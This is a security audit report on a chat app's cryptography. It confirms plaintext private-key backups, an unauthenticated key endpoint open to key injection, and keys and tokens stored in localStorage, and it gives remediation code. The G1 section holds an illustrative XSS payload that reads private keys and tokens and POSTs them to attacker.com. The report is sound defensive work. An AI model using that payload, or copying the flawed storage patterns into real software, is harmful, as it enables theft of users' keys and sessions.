# Crypto Runtime Validation Report (TASK 1.4-J) - ChatFlect

> **Version**: 1.0 | **Date**: 2026-02-07 | **Status**: P0 Complete

---

## Executive Summary

Code analysis confirms **CRITICAL** cryptographic vulnerabilities:
- **H2 CONFIRMED**: Private key exported in plaintext JSON backup
- **E1 CONFIRMED**: No client-side public key verification
- **G1 CONFIRMED**: Private key stored in plaintext localStorage

| Severity | Finding | Status |
| :---: | :--- | :---: |
| 🔴 CRITICAL | Plaintext backup exposes master private key (H2) | CONFIRMED |
| 🔴 CRITICAL | Backend key injection possible (E1) | CONFIRMED |
| 🟡 HIGH | Private key in plaintext localStorage (G1) | CONFIRMED |
| ⚠️ MEDIUM | No key signature verification | CONFIRMED |

---

## H2: Plaintext Backup Exposure

### Evidence

**File**: `secure-chat-app/src/app/services/backup.service.ts`

```typescript
// Lines 17-41
async createBackup(): Promise<Blob> {
    const data: any = {
        version: 1,
        date: new Date().toISOString(),
        keys: {
            private_key: localStorage.getItem('private_key'),  // ← PLAINTEXT
            public_key: localStorage.getItem('public_key'),
            user_id: localStorage.getItem('user_id'),
            firstName: localStorage.getItem('firstName'),
            lastName: localStorage.getItem('lastName'),
            photoUrl: localStorage.getItem('photoUrl')
        },
    };

    // Lines 33-37 - Developer comment acknowledges issue:
    // "Ideally, we encrypt this JSON with a user-provided password"
    // "For MVP, we'll export plainly but warn user"

    const json = JSON.stringify(data);  // ← NO ENCRYPTION
    const blob = new Blob([json], { type: 'application/json' });
    return blob;
}
```

### Impact

| Attribute | Value |
| :--- | :--- |
| **Attack Scenario** | Attacker obtains backup file (cloud sync, email, physical access) |
| **Result** | Complete identity takeover, decrypt all past/future messages |
| **Likelihood** | 4 (Likely) |
| **Impact** | 5 (Critical) |
| **Risk Score** | **20 (CRITICAL)** |

### Remediation Required

```typescript
// Phase 2 Fix: Encrypted Backup
async createBackup(password: string): Promise<Blob> {
    const data = { /* keys, etc */ };
    
    // Derive key from password
    const salt = crypto.getRandomValues(new Uint8Array(16));
    const key = await crypto.subtle.deriveKey(
        { name: 'PBKDF2', salt, iterations: 100000, hash: 'SHA-256' },
        await crypto.subtle.importKey('raw', new TextEncoder().encode(password), 'PBKDF2', false, ['deriveKey']),
        { name: 'AES-GCM', length: 256 },
        false,
        ['encrypt']
    );
    
    // Encrypt JSON
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt(
        { name: 'AES-GCM', iv },
        key,
        new TextEncoder().encode(JSON.stringify(data))
    );
    
    // Return encrypted blob with salt + iv header
    return new Blob([salt, iv, new Uint8Array(encrypted)], { type: 'application/octet-stream' });
}
```

---

## E1: Backend Key Injection

### Evidence

**File**: `secure-chat-backend/api/keys.php`

```php
// Lines 12-49 - No authentication required
if (isset($_GET['user_id'])) {
    $uid = trim(strtoupper($_GET['user_id']));
    
    // Fetches public keys without verifying caller
    $stmt = $conn->prepare("SELECT device_uuid, public_key FROM user_devices WHERE user_id = ?");
    // ...
    echo json_encode($response);  // ← Anyone can read keys
}
```

**Attack Path**:
1. Attacker compromises backend or gains DB access
2. Attacker modifies victim's `public_key` in `user_devices` table
3. Future messages to victim are encrypted to attacker's key
4. Attacker runs MITM relay to victim

**File**: `secure-chat-app/src/app/services/chat.service.ts`

```typescript
// Client fetches keys without signature verification
// No mechanism to detect if key was tampered
```

### Impact

| Attribute | Value |
| :--- | :--- |
| **Attack Scenario** | Malicious insider or compromised backend |
| **Result** | Silent MITM on all communications |
| **Likelihood** | 3 (Moderate) |
| **Impact** | 5 (Critical) |
| **Risk Score** | **15 (HIGH)** |

### Remediation Required

1. **Sign key bundles with identity key**
2. **Implement Safety Numbers for out-of-band verification**
3. **Alert on key changes**

---

## G1: Plaintext localStorage Storage

### Evidence

**Multiple files store private_key in raw localStorage**:

| File | Line | Code |
| :--- | :---: | :--- |
| `auth.service.ts` | 288 | `localStorage.setItem('private_key', privateKeyStr);` |
| `auth.service.ts` | 341 | `localStorage.setItem('private_key', privateKeyStr);` |
| `backup.service.ts` | 52 | `localStorage.setItem('private_key', data.keys.private_key);` |
| `link.service.ts` | 79 | `localStorage.setItem('private_key', data.private_key);` |
| `chat.service.ts` | 726 | `const privateKeyStr = localStorage.getItem('private_key');` |

### XSS Attack Scenario

```javascript
// Attacker XSS payload
const stolenKeys = {
    private_key: localStorage.getItem('private_key'),
    public_key: localStorage.getItem('public_key'),
    access_token: localStorage.getItem('access_token'),
    refresh_token: localStorage.getItem('refresh_token'),
    user_id: localStorage.getItem('user_id')
};

// Exfiltrate to attacker server
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(stolenKeys)
});
```

### Impact

| Attribute | Value |
| :--- | :--- |
| **Attack Scenario** | XSS vulnerability in any input field |
| **Result** | Complete identity and E2EE takeover |
| **Likelihood** | 3 (Moderate) |
| **Impact** | 5 (Critical) |
| **Risk Score** | **15 (HIGH)** |

---

## Token Storage Findings

### Tokens in localStorage

| Key | Sensitivity | XSS Accessible |
| :--- | :---: | :---: |
| `access_token` | HIGH | ✓ YES |
| `refresh_token` | HIGH | ✓ YES |
| `id_token` | HIGH | ✓ YES |
| `private_key` | CRITICAL | ✓ YES |

### Remediation Required

1. Migrate tokens to HTTP-Only cookies
2. Use SecureStorage plugin on mobile
3. Implement CSP to mitigate XSS

---

## Cipher Version Analysis

### Current Implementation

**File**: `crypto.service.ts`

The application supports cipher versions v1 and v2. Analysis shows:
- v1: Basic AES-GCM encryption
- v2: Double ratchet implementation

**Downgrade Risk**: If a v2 client accepts v1 messages without warning, an attacker could force downgrade to weaker protocol.

---

## Summary Table

| Threat ID | Threat | Expected | Actual | Status |
| :---: | :--- | :---: | :---: | :---: |
| **H2** | Plaintext Backup | Encrypted | PLAINTEXT | 🔴 CONFIRMED |
| **E1** | Key Injection | Signed keys | UNSIGNED | 🔴 CONFIRMED |
| **G1** | localStorage Keys | Secure storage | PLAINTEXT | 🔴 CONFIRMED |
| **CP-04** | Downgrade Attack | v2 enforced | Needs testing | ⚠️ PARTIAL |

---

## Phase 2 Remediation Priority

| Priority | Fix | Epic |
| :---: | :--- | :---: |
| P0 | Encrypted backup with PBKDF2 | E2 |
| P0 | Signed key bundles | E3 |
| P1 | Token migration to HTTP-Only | E5 |
| P1 | SecureStorage for mobile keys | E4 |
